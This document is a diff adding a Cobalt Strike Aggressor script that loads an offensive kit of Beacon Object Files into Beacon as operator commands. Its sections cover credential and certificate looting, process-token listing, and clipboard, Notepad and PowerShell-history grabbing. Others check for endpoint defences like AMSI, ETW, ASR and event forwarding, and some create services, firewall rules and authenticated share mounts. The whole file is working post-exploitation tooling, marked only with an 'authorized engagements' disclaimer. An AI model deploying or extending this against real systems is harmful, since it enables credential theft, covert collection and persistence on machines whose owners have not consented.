@@ -1,0 +1,345 @@
+# Adrenaline BOF Kit — Cobalt Strike Aggressor Script
+#
+# Loads every BOF in this repository into Beacon as a native command.
+# Load via Cobalt Strike -> Script Manager -> Load (or team server
+# aggressor autostart). Paths are resolved relative to this file, so keep
+# it at the repository root.
+#
+# Argument packing (bof_pack format characters) was derived directly from
+# each module's go() function (BeaconDataExtract/BeaconDataShort/
+# BeaconDataInt calls), not guessed from the README alone:
+#   z = narrow (char*) string      Z = wide (wchar_t*) string
+#   s = 16-bit short                i = 32-bit int
+#
+# Only the x64 build is wired up here (x64 is always built; x86 is
+# optional per-module). Swap ".x64.o" for ".x86.o" in bof_run() calls
+# below if you need a 32-bit beacon variant that exists for that module.
+#
+# DISCLAIMER: offensive-security tooling for authorized engagements only.
+# See the repository README for the full disclaimer.
+
+sub bof_run {
+    # $1 = bid, $2 = path to .o relative to this script, $3 = bof_pack() blob
+    local('$handle $data');
+    $handle = openf(script_resource($2));
+    $data   = readb($handle, -1);
+    closef($handle);
+    btask($1, "Running BOF: " . $2);
+    beacon_inline_execute($1, $data, "go", $3);
+}
+
+# ===========================================================================
+# Collection
+# ===========================================================================
+
+alias ai_surface {
+    bof_run($1, "collection/ai_surface/ai_surface.x64.o", bof_pack($1, ""));
+}
+
+alias clipboard_grab {
+    bof_run($1, "collection/clipboard_grab/clipboard_grab.x64.o", bof_pack($1, ""));
+}
+
+alias ide_extension_surface {
+    bof_run($1, "collection/ide_extension_surface/ide_extension_surface.x64.o", bof_pack($1, ""));
+}
+
+alias powershell_history {
+    bof_run($1, "collection/powershell_history/powershell_history.x64.o", bof_pack($1, ""));
+}
+
+alias window_handles_enum {
+    bof_run($1, "collection/window_handles_enum/window_handles_enum.x64.o", bof_pack($1, ""));
+}
+
+# ===========================================================================
+# Community
+# ===========================================================================
+
+# notepad_grab [title_filter]
+alias notepad_grab {
+    if ($2 !is $null && $2 ne "") {
+        bof_run($1, "community/notepad_grab/notepad_grab.x64.o", bof_pack($1, "z", $2));
+    } else {
+        bof_run($1, "community/notepad_grab/notepad_grab.x64.o", bof_pack($1, ""));
+    }
+}
+
+# schtask_enum [server]
+alias schtask_enum {
+    if ($2 !is $null && $2 ne "") {
+        bof_run($1, "community/schtask_enum/schtask_enum.x64.o", bof_pack($1, "z", $2));
+    } else {
+        bof_run($1, "community/schtask_enum/schtask_enum.x64.o", bof_pack($1, ""));
+    }
+}
+
+alias session_view {
+    bof_run($1, "community/session_view/session_view.x64.o", bof_pack($1, ""));
+}
+
+# net_use add <share> <username> <password> <device> <persist 0|1> <requirePrivacy 0|1>
+# net_use list [device]
+# net_use delete <device> <persist 0|1> <force 0|1>
+alias net_use {
+    local('$sub $args');
+    $sub = lower($2);
+
+    if ($sub eq "add") {
+        $args = bof_pack($1, "sZZZZss", 1, $3, $4, $5, $6, $7, $8);
+    } else if ($sub eq "list") {
+        if ($3 !is $null && $3 ne "") {
+            $args = bof_pack($1, "sZ", 2, $3);
+        } else {
+            $args = bof_pack($1, "sZ", 2, "");
+        }
+    } else if ($sub eq "delete") {
+        if ($3 is $null || $3 eq "") {
+            berror($1, "Usage: net_use delete <device> <persist 0|1> <force 0|1>");
+            return;
+        }
+        $args = bof_pack($1, "sZss", 3, $3, $4, $5);
+    } else {
+        berror($1, "Usage: net_use <add <share> <user> <pass> <device> <persist> <reqPrivacy> | list [device] | delete <device> <persist> <force>>");
+        return;
+    }
+
+    bof_run($1, "community/net_use/net_use.x64.o", $args);
+}
+
+# ===========================================================================
+# Credential Access
+# ===========================================================================
+
+# certstore_loot [store_name location(CurrentUser|LocalMachine)]
+alias certstore_loot {
+    if ($2 !is $null && $2 ne "" && $3 !is $null && $3 ne "") {
+        bof_run($1, "credential_access/certstore_loot/certstore_loot.x64.o", bof_pack($1, "zz", $2, $3));
+    } else {
+        bof_run($1, "credential_access/certstore_loot/certstore_loot.x64.o", bof_pack($1, ""));
+    }
+}
+
+# cloud_metadata_check [presence] [-aud arm|graph|other <resource>]
+alias cloud_metadata_check {
+    local('$n');
+    $n = 0;
+    if ($2 !is $null && $2 ne "") { $n = 1; }
+    if ($3 !is $null && $3 ne "") { $n = 2; }
+    if ($4 !is $null && $4 ne "") { $n = 3; }
+    if ($5 !is $null && $5 ne "") { $n = 4; }
+
+    if ($n == 0) {
+        bof_run($1, "credential_access/cloud_metadata_check/cloud_metadata_check.x64.o", bof_pack($1, ""));
+    } else if ($n == 1) {
+        bof_run($1, "credential_access/cloud_metadata_check/cloud_metadata_check.x64.o", bof_pack($1, "z", $2));
+    } else if ($n == 2) {
+        bof_run($1, "credential_access/cloud_metadata_check/cloud_metadata_check.x64.o", bof_pack($1, "zz", $2, $3));
+    } else if ($n == 3) {
+        bof_run($1, "credential_access/cloud_metadata_check/cloud_metadata_check.x64.o", bof_pack($1, "zzz", $2, $3, $4));
+    } else {
+        bof_run($1, "credential_access/cloud_metadata_check/cloud_metadata_check.x64.o", bof_pack($1, "zzzz", $2, $3, $4, $5));
+    }
+}
+
+# process_tokens_list [pid|process_name] [/debug]
+alias process_tokens_list {
+    if ($2 !is $null && $2 ne "" && $3 !is $null && $3 ne "") {
+        bof_run($1, "credential_access/process_tokens_list/process_tokens_list.x64.o", bof_pack($1, "zz", $2, $3));
+    } else if ($2 !is $null && $2 ne "") {
+        bof_run($1, "credential_access/process_tokens_list/process_tokens_list.x64.o", bof_pack($1, "z", $2));
+    } else {
+        bof_run($1, "credential_access/process_tokens_list/process_tokens_list.x64.o", bof_pack($1, ""));
+    }
+}
+
+# ===========================================================================
+# Discovery
+# ===========================================================================
+
+alias amsi_etw_detect {
+    bof_run($1, "discovery/amsi_etw_detect/amsi_etw_detect.x64.o", bof_pack($1, ""));
+}
+
+alias app_count {
+    bof_run($1, "discovery/app_count/applications_enum.x64.o", bof_pack($1, ""));
+}
+
+alias applocker_policy {
+    bof_run($1, "discovery/applocker_policy/applocker_policy.x64.o", bof_pack($1, ""));
+}
+
+alias asr_status {
+    bof_run($1, "discovery/asr_status/asr_status.x64.o", bof_pack($1, ""));
+}
+
+alias bitlocker_status {
+    bof_run($1, "discovery/bitlocker_status/bitlocker_status.x64.o", bof_pack($1, ""));
+}
+
+alias mdm_policy_artifacts {
+    bof_run($1, "discovery/mdm_policy_artifacts/mdm_policy_artifacts.x64.o", bof_pack($1, ""));
+}
+
+alias netjoin_query {
+    bof_run($1, "discovery/netjoin_query/netjoin_query.x64.o", bof_pack($1, ""));
+}
+
+alias power_state {
+    bof_run($1, "discovery/power_state/power_state.x64.o", bof_pack($1, ""));
+}
+
+alias proxy_enum {
+    bof_run($1, "discovery/proxy_enum/proxy_enum.x64.o", bof_pack($1, ""));
+}
+
+# tray_scout [verbose]
+alias tray_scout {
+    if ($2 !is $null && $2 ne "") {
+        bof_run($1, "discovery/tray_scout/tray_scout.x64.o", bof_pack($1, "z", $2));
+    } else {
+        bof_run($1, "discovery/tray_scout/tray_scout.x64.o", bof_pack($1, ""));
+    }
+}
+
+alias user_idle {
+    bof_run($1, "discovery/user_idle/user_idle.x64.o", bof_pack($1, ""));
+}
+
+alias wallpaper_enum {
+    bof_run($1, "discovery/wallpaper_enum/wallpaper_enum.x64.o", bof_pack($1, ""));
+}
+
+alias wef_detect {
+    bof_run($1, "discovery/wef_detect/wef_detect.x64.o", bof_pack($1, ""));
+}
+
+alias win_version {
+    bof_run($1, "discovery/win_version/win_version.x64.o", bof_pack($1, ""));
+}
+
+# window_list [/pid]
+alias window_list {
+    if ($2 !is $null && $2 ne "") {
+        bof_run($1, "discovery/window_list/window_list.x64.o", bof_pack($1, "z", $2));
+    } else {
+        bof_run($1, "discovery/window_list/window_list.x64.o", bof_pack($1, ""));
+    }
+}
+
+alias wsc_status {
+    bof_run($1, "discovery/wsc_status/wsc_status.x64.o", bof_pack($1, ""));
+}
+
+# ===========================================================================
+# Execution
+# ===========================================================================
+
+# com_probe <CLSID> [IID]
+alias com_probe {
+    if ($2 is $null || $2 eq "") {
+        berror($1, "Usage: com_probe <CLSID> [IID]");
+        return;
+    }
+    if ($3 !is $null && $3 ne "") {
+        bof_run($1, "execution/com_probe/com_probe.x64.o", bof_pack($1, "zz", $2, $3));
+    } else {
+        bof_run($1, "execution/com_probe/com_probe.x64.o", bof_pack($1, "z", $2));
+    }
+}
+
+# firewall_rule add <name> <in|out> <allow|block> <tcp|udp|any> [localport] [remoteport] [profile]
+# firewall_rule remove <name>
+# firewall_rule query <name>
+# firewall_rule list
+alias firewall_rule {
+    local('$sub $lport');
+    $sub = lower($2);
+
+    if ($sub eq "list") {
+        bof_run($1, "execution/firewall_rule/firewall_rule.x64.o", bof_pack($1, "z", "list"));
+    } else if ($sub eq "remove" || $sub eq "query") {
+        if ($3 is $null || $3 eq "") {
+            berror($1, "Usage: firewall_rule " . $sub . " <name>");
+            return;
+        }
+        bof_run($1, "execution/firewall_rule/firewall_rule.x64.o", bof_pack($1, "zz", $sub, $3));
+    } else if ($sub eq "add") {
+        if ($3 is $null || $3 eq "" || $4 is $null || $4 eq "" || $5 is $null || $5 eq "" || $6 is $null || $6 eq "") {
+            berror($1, "Usage: firewall_rule add <name> <in|out> <allow|block> <tcp|udp|any> [localport] [remoteport] [profile]");
+            return;
+        }
+        $lport = $7;
+        if ($lport is $null) { $lport = ""; }
+
+        if ($9 !is $null && $9 ne "") {
+            bof_run($1, "execution/firewall_rule/firewall_rule.x64.o", bof_pack($1, "zzzzzzzz", $sub, $3, $4, $5, $6, $lport, $8, $9));
+        } else if ($8 !is $null && $8 ne "") {
+            bof_run($1, "execution/firewall_rule/firewall_rule.x64.o", bof_pack($1, "zzzzzzz", $sub, $3, $4, $5, $6, $lport, $8));
+        } else {
+            bof_run($1, "execution/firewall_rule/firewall_rule.x64.o", bof_pack($1, "zzzzzz", $sub, $3, $4, $5, $6, $lport));
+        }
+    } else {
+        berror($1, "Usage: firewall_rule <add|remove|query|list> ...");
+    }
+}
+
+# service_control query [service_name]
+# service_control create <service_name> <bin_path> [display_name] [start_type] [service_type] [error_control]
+# service_control start|stop|delete <service_name>
+# service_control failure <service_name> <reset_seconds> [reboot_msg] [command] [actions]
+alias service_control {
+    local('$sub $path');
+    $sub = lower($2);
+    $path = "execution/service_control/service_control.x64.o";
+
+    if ($sub eq "query") {
+        if ($3 !is $null && $3 ne "") {
+            bof_run($1, $path, bof_pack($1, "ZZ", $sub, $3));
+        } else {
+            bof_run($1, $path, bof_pack($1, "Z", $sub));
+        }
+    } else if ($sub eq "start" || $sub eq "stop" || $sub eq "delete") {
+        if ($3 is $null || $3 eq "") {
+            berror($1, "Usage: service_control " . $sub . " <service_name>");
+            return;
+        }
+        bof_run($1, $path, bof_pack($1, "ZZ", $sub, $3));
+    } else if ($sub eq "create") {
+        if ($3 is $null || $3 eq "" || $4 is $null || $4 eq "") {
+            berror($1, "Usage: service_control create <service_name> <bin_path> [display_name] [start_type] [service_type] [error_control]");
+            return;
+        }
+        if ($8 !is $null && $8 ne "") {
+            bof_run($1, $path, bof_pack($1, "ZZZZiii", $sub, $3, $4, $5, $6, $7, $8));
+        } else if ($7 !is $null && $7 ne "") {
+            bof_run($1, $path, bof_pack($1, "ZZZZii", $sub, $3, $4, $5, $6, $7));
+        } else if ($6 !is $null && $6 ne "") {
+            bof_run($1, $path, bof_pack($1, "ZZZZi", $sub, $3, $4, $5, $6));
+        } else if ($5 !is $null && $5 ne "") {
+            bof_run($1, $path, bof_pack($1, "ZZZZ", $sub, $3, $4, $5));
+        } else {
+            bof_run($1, $path, bof_pack($1, "ZZZ", $sub, $3, $4));
+        }
+    } else if ($sub eq "failure") {
+        if ($3 is $null || $3 eq "" || $4 is $null || $4 eq "") {
+            berror($1, "Usage: service_control failure <service_name> <reset_seconds> [reboot_msg] [command] [actions]");
+            return;
+        }
+        if ($7 !is $null && $7 ne "") {
+            bof_run($1, $path, bof_pack($1, "ZZiZZZ", $sub, $3, $4, $5, $6, $7));
+        } else if ($6 !is $null && $6 ne "") {
+            bof_run($1, $path, bof_pack($1, "ZZiZZ", $sub, $3, $4, $5, $6));
+        } else if ($5 !is $null && $5 ne "") {
+            bof_run($1, $path, bof_pack($1, "ZZiZ", $sub, $3, $4, $5));
+        } else {
+            bof_run($1, $path, bof_pack($1, "ZZi", $sub, $3, $4));
+        }
+    } else {
+        berror($1, "Usage: service_control <query|create|start|stop|delete|failure> ...");
+    }
+}
+
+alias wevt_logon_enum {
+    bof_run($1, "execution/wevt_logon_enum/wevt_logon_enum.x64.o", bof_pack($1, ""));
+}
